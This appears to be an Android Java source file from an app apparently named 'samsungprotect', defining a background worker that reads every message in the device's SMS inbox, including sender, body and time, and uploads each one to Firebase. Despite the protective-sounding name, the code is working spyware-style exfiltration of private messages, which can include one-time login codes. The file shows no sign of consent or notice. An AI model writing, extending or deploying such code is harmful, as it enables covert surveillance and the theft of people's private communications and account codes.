package com.example.samsungprotect.MonitoringService;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.example.samsungprotect.Firebase.FirebaseHelper;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSInboxWorker extends Worker {

    private static final String TAG = "SMSInboxWorker";

    public SMSInboxWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.d(TAG, "Reading inbox...");
        Context context = getApplicationContext();

        Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER
        );

        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                String formattedTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                        .format(new Date(timestamp));

                FirebaseHelper.uploadSMS("inbox", address, body, formattedTime);
                count++;
            }
            cursor.close();
            Log.d(TAG, "Inbox scan complete. Total messages uploaded: " + count);
        } else {
            Log.w(TAG, "Cursor was null. Could not read inbox.");
        }

        return Result.success();
    }

    // 🔹 Call this from MainActivity or anywhere else to trigger the worker once
    public static void runOnce(Context context) {
        Log.i(TAG, "runOnce() called. Enqueuing SMSInboxWorker.");
        OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(SMSInboxWorker.class).build();
        WorkManager.getInstance(context).enqueue(workRequest);
    }
}
